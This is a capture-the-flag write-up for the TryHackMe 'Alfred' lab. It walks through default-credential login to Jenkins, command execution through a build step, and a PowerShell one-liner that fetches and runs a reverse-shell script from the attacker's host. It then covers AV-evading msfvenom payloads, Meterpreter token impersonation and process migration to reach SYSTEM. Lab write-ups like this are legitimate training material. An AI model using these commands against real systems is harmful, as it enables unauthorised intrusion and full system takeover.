# TryHackMe-Alfred


## Rustscan

```bash                                                                                                                      
PORT     STATE SERVICE    REASON          VERSION   
80/tcp   open  http       syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:                                                    
|   Supported Methods: OPTIONS TRACE GET HEAD POST                        
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5      
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped syn-ack ttl 127  
8080/tcp open  http       syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT        
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1     
| http-robots.txt: 1 disallowed entry                                     
|_/                                                                       
|_http-server-header: Jetty(9.4.z-SNAPSHOT)                               
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                  
```

## PORT 80 (HTTP)

<img src="https://imgur.com/OzQMPUD.png"/>

Here we don't see anything intersting so let's move to other http port

## PORT 8080 (HTTP)

<img src="https://imgur.com/aXHhYWT.png"/>

We can see jenkins login portal so let's try using the default credentials

`admin:password`

<img src="https://imgur.com/hrO4m40.png"/>

And it didn't work , let's try `admin:admin`

<img src="https://imgur.com/aFModUR.png"/>


This worked are we are in, now we need to find where we can execute commands so we can get a reverse shell on the target machine 

Hover over the `project` you'll get a dropdown menu

 <img src="https://i.imgur.com/15CMp1p.png"/>
You'll have options like "Changes", "Workspace", "Build Now", "Delete Project"," Configure" and "Rename". Select `Configure`

<img src="https://imgur.com/msvm69Y.png"/>

Switch to `Build Environment Tab`

<img src="https://i.imgur.com/yUPIbcb.png"/>

Here you can see there's a command written `whoami` so let's click on `Apply` and `Save`

<img src="https://i.imgur.com/eXEBFF6.png"/>

Click on `#2` then `Console Ouput`

<img src="https://i.imgur.com/H0Bx0xH.png"/>

<img src="https://imgur.com/0S5GrCG.png"/>

And you can see what ever command we input there it will show the output so now what we can do is to host a powershell reverse shell script ,download it using powershell and execute the function in the script to get a shell

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

Start your python3 http server

<img src="https://imgur.com/Ffh7FPk.png"/>

And our command will look like this , start a netcat listener

<img src="https://imgur.com/L7kRLea.png"/>

<img src="https://imgur.com/GGcjVVU.png"/>

Now click on `Build Now` and that job will run and you'll get a shell

<img src="https://imgur.com/2LThZZr.png"/>

Generate a msfvenom payload with encoders to by pass AV 

Host it on your local machine and download it by repeating the same method

<img src="https://imgur.com/2px77nI.png"/>

Set up your metasploit listener

<img src="https://imgur.com/IKY1jka.png"/>

<img src="https://imgur.com/G6SR5wL.png"/>

<img src="https://i.imgur.com/uhZl5vx.png"/>

Execute the payload and you'll see a meterpreter session will be popped

<img src="https://i.imgur.com/YF8AsSf.png"/>

Running the command `getprivs` we can see what privileges we have on the machine

<img src="https://i.imgur.com/zaqoz9K.png"/>

Here we can escalate our privleges through `SeImpersonatePrivilege`

Run the command `load icognito` through this module we can impersonate tokens

<img src="https://imgur.com/IbKIzYL.png"/>

<img src="https://imgur.com/macZDV5.png"/>

<img src="https://i.imgur.com/enPc6EW.png"/>

<img src="https://imgur.com/iE8Xsw7.png"/>

<img src="https://imgur.com/Ivy4Yaa.png"/>

Now even though we have SYSTEM on the machine but still we won't be able to access system files as it uses the primary token of the process and not the impersonated token so we need to migrate to a process running as SYSTEM which is `services.exe`

<img src="https://i.imgur.com/ltPg2LG.png"/>

<img src="https://imgur.com/3P3tLr5.png"/>

<img src="https://imgur.com/h1cTVks.png"/>